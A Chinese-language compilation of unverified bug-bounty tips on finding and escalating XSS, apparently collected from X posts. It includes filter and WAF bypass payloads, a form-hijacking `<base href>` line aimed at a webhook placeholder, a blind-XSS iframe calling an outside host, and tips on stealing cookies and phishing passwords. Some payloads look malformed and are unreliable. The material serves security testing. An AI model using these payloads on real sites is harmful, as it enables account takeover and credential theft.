# X 经验语料 · xss

来源：X 公开贴子，经逐条判定后归入「经验」桶。
这些贴子给出做法/判断经验，但多数缺少可直接复现的完整载荷链；
与 x-xss-*.md（技术桶，含具体载荷）配合阅读。
仅纯文本，图片与外部媒体已剥离。作者自述，未经复现验证。
纯战绩播报（"我又拿了一个 bounty"）、只有提问没有答复、"来看我的视频/频道"、
以及明显错误的"技巧"已剔除；同一技巧被反复转贴的只留一份。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[XSS](../by-type/xss.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-xss-1（300 条）、x-xss-2（300 条）、x-xss-3（266 条）、x-residual-xss（111 条） · 本文 238 行

## 先读文档与源码

- 先搞清楚站点怎么运转：逐个功能看一遍，再通过 view-source 看内部函数怎么拼出来的。
- 翻 .js 文件时重点找 innerHTML。出现它就意味着这里有 XSS 的可能。
- 存储型 XSS 也可以纯靠翻 JS 文件找出来——接口名、参数名、模板片段都在里面。
## 反射点在哪里
- 把所有输入都打一遍，不要只打第一个。开发最常漏的是 Address2 / Unit 这类次要字段。
- 把 cookie 名当作参数名去测——这样能挖出 CRLF、反射型 XSS 和存储型 XSS。
- 每个站都该跑 Param Miner。上周它挖出一个隐藏 URL 参数，值被反射进 JavaScript，直接成 XSS。
- arjun 挖出隐藏参数 tab，回源码一看就是反射型 XSS。
- 捞到 3G 日志文件，从里面找 SQLi 和 XSS。日志文件本身也是入口。
- 凡是能存值的地方都去测存储型 XSS。
- 存储型 XSS 容易漏的一点：payload 往往不在你提交的那个页面执行。
  要把每个页面的源码都看一遍，它会跑到别的路径上去。
- 年龄/数量这类数字输入框，UI 上不让输文本，但开发者常常忘了后端也做过滤。用 Burp 直接改。
- 撞到 404 页面别走，继续 fuzz 路径，XSS 和信息泄露常常就在那后面。
## 反射位置与上下文
- 路径里反射（/xsshere）但一加 `<` 这类字符就 400/404？加一个无用的 GET 参数，把 payload 放到参数里试。
- domain/<payload> 被重定向到错误页时，试 domain?<payload>。
- payload 放在 URL 里被拦，试在末尾加 `#`，比如 `#settings` 或任意 `#` 后面的东西。反射常常还留在那儿。
- 函数把你重定向了、但源码页看不到反射——照样把 payload 塞进去，很可能是 DOM XSS。
- 测反射别只看 view-source（Ctrl+U）。用 inspect（F12），DOM 反射在 Ctrl+U 里永远看不到。
- 输入反射进 `<textarea>…</textarea>` 时，先 `</textarea>` 闭合，再接载荷。
- 路径型 XSS：往每一段 path 都塞一次载荷；再给每个 path 追加假参数各试一次。
- 双引号被转义了也别放弃，仍然试着提前闭合标签。
  WAF 难缠时换冷门标签：video、audio、image。
- 所有标签都被拦时试 `<image>`——开发者总是忘了它。
- `<h1>` 不生效时换 `<h2>`、`<h3>` 依次往下试。
- 过滤器把每个标签都吃掉时，把标签套在标签里：`<<k>/script>`。它只删掉 `<k>`，script 标签就进去了。
- 不含 `& < > " = ( )` 的 XSS 载荷是可以写出来的。
- 有 HTML 注入但受 CSP/过滤所限升不到 XSS 时，用 dangling markup 证明影响。
  表单用相对路径且缺 CSP base-uri 时，可以劫持：
  <base href="https://[WEBHOOK]">
- 同上，位置不够写长 payload 时用 `<base href=//url.co>`，页面上所有链接都会跳到你的域。
- 注意输入被反射进 HTTP 头。我遇到用户可控文件名出现在 content-disposition 里，
  由此做成 CRLF 注入，把响应 content-type 改成 text/html，升成 XSS。
## 绕过过滤与 WAF
- `javascript:` 被 WAF 拦时的一批绕过写法。
- `javascript:` 被过滤时，在 `<a href='payload'>` 里还可以试：
  java%0Ascript:
  java%0Dscript:
  java%20script:
- 一个古怪的保护，我用这条绕过：
  %3c<aa+ONLOAD+href=javasONLOADcript:promptONLOAD(1)%3e
- 做重定向型 XSS（反射落在 `<a href>` 或 Location 头里），别忘了换别的 scheme 一起试。
- 过滤绕过的四步常规动作：
  1. 各种字符编码都过一遍：URL、双重 URL、UTF-8、长 UTF-8、Hex
  2. HTML 引号包裹形式各试一遍
  3. URL 字符串层面的规避
  4. 按"允许的关键词"反向拼载荷
- 目标把某个字符拉黑时，找一个等价的 Unicode 字符替代它。
- asp.net 站点，存储型 XSS 用全角 ＜ 和 ＞ 试。
  SQL Server 有时会把它们规范化成 < >，从而绕过过滤。
- WAF 前面，把 payload 拆到多个参数里拼起来，我靠这招成功过多次。
- WAF 盯 `(` 和反引号时，用这条：
  location.href = http://window.name
  然后把漏洞路径挂到你自己的域上去调。
- Lumberjack 载荷：关键字黑名单、禁括号、各种单引号都不让用时，把代码放进 URL 的 hash：
  放在 hash 段里写成 #javascript:whatever you want()
  页面里再用 frames["loca"+"tion"]=frames.location.hash[1]+… 拆开拼回去。
- 没有 WAF 的场景下，可以用能同时覆盖 XSS、报错型 SQLi、SSTI/CSTI 的那类扫描。
  记得把你的 BXSS 载荷追加到末尾。
- 一条变形载荷（作者自制的 XSS payload 生成器输出）：
  ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\
- `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxMDIpPC9zY3JpcHQ+"></object>`
- DOM XSS 但关键字和标签都被过滤时，用 document.createElement 造 script 元素，从外部服务器加载载荷执行。
- CSP 拦住 XSS 时，先在自己的浏览器 console 里确认这个 CSP 是否可绕（方法见 intigriti 原文）。
- 输入框拒绝你的 XSS 载荷时，先输一个随机字符，Burp 拦请求再替换成真载荷。
- 拿到 self XSS 后每次都做的事：把请求方法从 POST 改成 GET（或反向）。
  能不能成取决于技术栈和配置。
- 同一个技巧的实例：GET 参数不回显，改成 POST 后载荷就触发了。
- 载荷注进去了但响应是 plain/text？改 Accept 头就能改变响应。
  配合缓存可做成存储型 XSS。
- 看响应里的 X-Cache 是否为 HIT。是的话，反射型 XSS 有希望升级成存储型。
- 用 fetch 把 XSS 升成 ATO 时 Cloudflare 一直拦。换成 XMLHttpRequest 就通了。
  有时候指纹本身就是障碍。
## 文件上传
- 有图片上传功能时：
  1. 传一张图，看它落在什么 URL
  2. 若文件不在 CDN 上 →
  3. 传一个带 script 标签的 HTML 文件
  4. 上传成功就是 XSS
- 文件上传过滤绕过清单：
  * .htaccess  ← 直接传 htaccess
  * file.svg   ← SVG 即 XSS
  * file.SVg   ← 大小写必须试
  * .svg
  * file.php%
  * ' or '1'='1
  * _/./
  * file. svg   ← 无效扩展名
- 看到上传页就试：把 XSS 载荷放进文件名里。
- 头像处的绕过：改掉上传内容的 content-type 就进去了。
- 传了 XSS 但没触发？先别走。我最后发现它在另一个页面触发，只是那个页面要改参数才能访问到。
- PDF 上传也能存 XSS。经验：传完一定回头看响应，路径常常就写在里面。
- 别忘了上传功能里的 SVG 存储型 XSS。SVG 格式本身支持 script 标签，事后能访问到文件就会执行。
- XSS 藏到头像里：凡是头像/图片上传，都把 svg 试一遍。
- 支持表单里挂一个带 xss hunter 载荷的 SVG。只要后端有人打开它，
  referer 里可能就漏出内部域名等一堆东西。
- 通过 grayhatwarfare 翻短链相关资产时，找到一个旧的客服页面。
  在它的图片上传里传了带 Blind XSS 的 SVG，管理员一打开，cookie 就直接到手。
- 目标用 S3 / zendesk 时，去打文件上传，用 Burp 绕，可以打出存储型 XSS、XML DoS 和 SSRF。
- 遇到开放的 S3 bucket，把 XSS 载荷传进去做串联，P4 能抬到 P2：
  aws s3 cp XSS_PAYLOAD s3://target_S3_BUCKET/XSS_PAYLOAD.svg
- S3 桶的 object listing 里，专门找 HTML 文件——那多半是过期的营销页。
- 把 SVG Smuggling 和 HTML Smuggling 也纳入 XSS 报告。这两类经常能打出更高影响。
## Blind XSS 与存储型
- 先测 Blind HTML 注入，再上 Blind XSS。这个顺序能省很多事。
- 每个输入都撒一遍 Blind XSS 载荷，请求头用 Burp 的 match and replace 统一注入。
- 往"更新"类功能里种 Blind XSS 时要种至少两次。
  我那次是在 `User updated billing address FROM <payload>` 这句里执行成功的——
  只更新一次地址永远不会触发。
- 打 Blind XSS 时给每个载荷一个唯一标识，并逐步记录。
  等延迟触发打回 XSS Hunter 时，你才知道它到底从哪来的。
- 记得查垃圾邮件目录。XSS Hunter 的告警经常被判定成垃圾邮件。
- 我这条载荷的回调是 6 个月后才到的。建议主动联系 support 让他们去查你的账号，
  这样能立刻收到回调，然后顺着往下挖。
- 在沙箱环境里发现 XSS、或者弹不出 cookie 时，用这种脚本：弹出框要求用户输入密码，再把密码记到你服务器上。
- 存储型 XSS 的心理模型：把"一个看不见的管理员界面"当作在范围内，它才是你要打的目标。
- 同上：想象存在一块你看不到的、管理员才会看到的屏幕。
- 问题反馈表单里盲打 XSS 也很容易中——反正表单就那几个框，全填一遍。
- 凡是联系/反馈页：邮箱输入框试盲注 OS 注入，留言框试 Blind XSS。
- 联系表单一定要测。我碰到一个把收件人邮箱放在请求里的，拦截后改成受害者邮箱即可。
  From 参数就是 admin@org.com，正文带 HTML 注入即中。
- 联系表单我一次踩中三个：HTML 注入、CSTI/SSTI、Blind XSS。
  各字段的载荷可以互换着试。
- 通过用户名/名 测邮件里的 HTML 注入时，记得把"接收新闻和营销邮件"勾上。
  载荷常常只在那里被渲染。
- 邀请用户时，邀请请求里常带隐藏字段。这是测 Blind/存储型 XSS 的好位置。
- 邀请用户时把 XSS 放进被邀请者的用户名。管理员 @ 你的时候 Blind XSS 就执行了，
  拿到的 cookie 可以直接接管他的号。
- 同上：邀请成员的区块、以及成员邮箱列表页，都是可以打到其他团队成员的 XSS 位置。
- 往 User-Agent 里大量灌 Blind XSS 载荷，经常有收获。
- 开发者解析 User-Agent 有两种方式：
  1. 从数据库查 → 应该测 SQL 注入
  2. 用 JS 处理 → 应该测 self XSS，配合 HTTP 请求走私可升成存储型
- 测加密货币站点时，往 KYC 表单里塞 XSSHunter 载荷。
- 多数币圈站有"防钓鱼码"功能。把 Blind XSS 载荷填进防钓鱼码。
- 私有币圈项目的 Blind XSS，实体编码过的 iframe srcdoc：
  "><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;http://test.bxss.in&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
- 在 Markdown 或 BBCode 里怎么拿 XSS：
  Markdown : [Hi](javascript:alert(1))
  BBCode   : [url=javascript:alert(1)]Hi[/url]
  Markdown : )
  BBCode   : [img]" onerror="alert(1)[/img]
- 一定要测下单后的功能，比如订单评价。
- Android 赏金：反编译时用 scheme 全局搜一遍。
  我搜 `mfp://` 找到 `mfp://host/path/?url=`，影响是 WebView 里的 XSS、打开恶意 URL、
  用 intent:// 打开未导出的组件。
## DOM XSS 与 JavaScript
- 看到 `location.hash` / `location.href` 的值未经编码就流进 sink，就是 DOM XSS。
  例如：
  var hash = location.href
  .....innerHTML = hash
- 每次都查 jQuery 和 migrate 的版本 —— jQuery 选择器型 DOM XSS。
- `$.getScript()` 的 sink 值得单独准备载荷。站点用了 jQuery 就试。顺手确认版本与技术栈。
- 测 Web 应用时尽可能多撒 DOM Invader 的 canary，它会帮你找出可控 sink，DOM XSS 命中率明显提高。
- DOM XSS 的成因很简单：JavaScript 从攻击者可控的 source 里取了数据。
- AEM 项目：读 JS 找到参数，但卡在 Content-Type 上绕不过去。
  他的模板：KozinTemplates/setPreferences-xss.yaml
- 范围内有 Chrome 扩展时，看 manifest.json 里 content scripts 是怎么跟各个域交互的。
  有可能在受影响组件之外执行 XSS，直接升到 critical。
## HTML 注入与降级利用
- 对 Web 服务器"皮"一点，常有意外。注册页报了个 `eval()` 错误，顺着挖下去拿到了 RCE。
- 二级接管（second order takeover）在多数项目里按 critical 评，值得专门花时间。
- 不要只测 XSS，CSS 注入也要测。这段样式能执行 JS：
  red; } body { background-image: url('javascript:console.log(1337)');
- REGEXSS：过度贪婪的正则替换会破坏 HTML 净化，直接导致 XSS。
- SSRF 的突破口：
  - 任何接受 URL 的地方
  - 文件上传？把 `type="file"` 改成 `type="url"`，提交一个 URL
  - 图片上传？提交含 `image` 元素、载荷放在 `xlink:href` 的 SVG；再试 ImageMagick 的利用
- self HTML 注入 → SSRF 读内网文件。我那个注入只能对自己的账号生效，但足够往下走。
- SSRF 的 CVE 打不出影响时，试着让它去读外部主机上的 SVG，从而执行 XSS。
- 把 XSSHunter 的载荷塞进 PortSwigger 的 hackability 再发给目标，
  用来判断服务端是否执行 JS。顺带还能给盲 SSRF 留截图。
- 站上社交账号按钮一定要看：账号或页面不存在时，把那个用户名抢注下来。断链劫持 + XSS。
## 入口位置补充
- 别只盯输入框。文件元数据、HTTP 头、cookie 都是向量。polyglot 载荷能同时过过滤器和 WAF。
- fuzz XSS 必须用 polyglot，否则会漏掉一整批。
- 正式打之前先注一个最简单的 `<h1>Halloween</h1>`，确认反射与上下文。
- 永远回头看一眼输入载荷之后的那个响应。
- 两个很少人用的事件：`onGotpointercapture`、`onLostpointercapture`。
  行为类似 onclick，但要先调 setPointerCapture()，实战价值有限。
- 找 XSS 时别忘把 User-Agent 换成手机。用 Firefox 的 UA 切换插件就行。
- 同上，而且更具体：我这例里首页在手机端不一样，XSS 在用户名字段，
  载荷要用 UTF-16 编码。
- 载荷在 Firefox 里就是不打时，各种招都试完，再换个浏览器试。
- 在一个项目上什么都挖不到时，去翻它已公开的历史报告：
  hackerone hactivity、openbugbounty、推特搜索、Medium 文章。
  然后想办法绕过那些已经修掉的漏洞。
- sourcemap 也是入口：把 .min 去掉换成 .map（如 app.min.js → app.js.map），
  再用 source-map-unpack、sourcemapper 还原源码，里面找密钥和 XSS 问题。
- 怎么判断一个项目不值得投时间：注册测试环境后，看到满屏都是被人打进去的 XSS 载荷，
  而且所有测试数据本身都是"payload"——整个应用已经烂了。直接走。
## 提级与报告策略
- 影响力才是赏金的关键。即使拿到 P4/P5 也试着串联。
  比如一个开放重定向，可以跟 XSS 串起来。
- 同上：拿到 P4/P5 就找东西串。单独一个 XSS 也许不值钱，串上 SSRF 就值了。
- 拿到未校验跳转先别急着报，试着把它打成反射型 XSS，报告会好看很多。
- 重点检查用于跳转的那个参数：开放重定向 + RXSS 是常见组合。
- 挖到 RXSS 就顺手测 SQLi。XSS 没做好输入净化的地方，SQLi 往往也漏着。
- 我们证实了 XSS 可以走到 RCE。永远试着往上提。
- self-XSS 串上 CSRF 被接受了。
  不要因为"只是 self-XSS"就放弃，先看它是否同时也存在 CSRF、WCP，
  能打到别人身上就是有效漏洞。
- 有 CSRF 时可以这样串：创建管理员账号、改账号设置、AKO、串 self-XSS。
- 一个 bug 有多个变体（比如 XSS）时，只报最基础的那个。
  等它 triaged + resolved 之后再回去试其他变体，看能不能绕过修复。一个洞变两份报告。
- 同上，并且强调：如果你不用任何混淆就能触发，就别报混淆版。
  等 resolved 之后再去绕，再拿一份。
- 永远用不同的 XSS 载荷去绕已有的修复。
- 一个"已经修好"的站，回去复测，XSS 又弹了。
- 打开站点的 scope 变更通知。我这条是加入范围 4 小时后报的，用的就是最普通的载荷。
## 工具
- XSSHUNTER、KN0XSS 两个平台，或者给 Burp Pro 装 XSS-validator 扩展。载荷一响就能收邮件或在面板上看记录。
- KN0XSS 自带的 Blind XSS 服务是免费的，但载荷得手工粘到目标上才会记录。查收时注意垃圾箱。
- 用 Burp 配合 cheat sheet，可以快速摸清目标黑名单到底放行了哪些标签和事件。
- Burp 的 XSS Cheatsheet 扩展，在 Burp 里直接搜载荷。
- toxssin 可以测存储型 XSS，并看清能劫持到什么。
- 要测带外载荷（Blind XSS / SSRF），Burp Collaborator 之外的选择：
  OWASP ZAP 的 OAST、mole、projectdiscovery 的 interactsh。都可以自建。
- jaeles 的 poliglot-xss 签名能同时检测 DOM 和反射型 XSS。
- 批量筛反射点的流程：
  paramspider -l sub.txt          # 结果落在 paramspider/results
  cat *.txt | kxss               # 筛出会反射的
- toxicache：Go 写的缓存投毒扫描器，可以对一批 URL 跑多种注入手法（作者 xhzeem）。
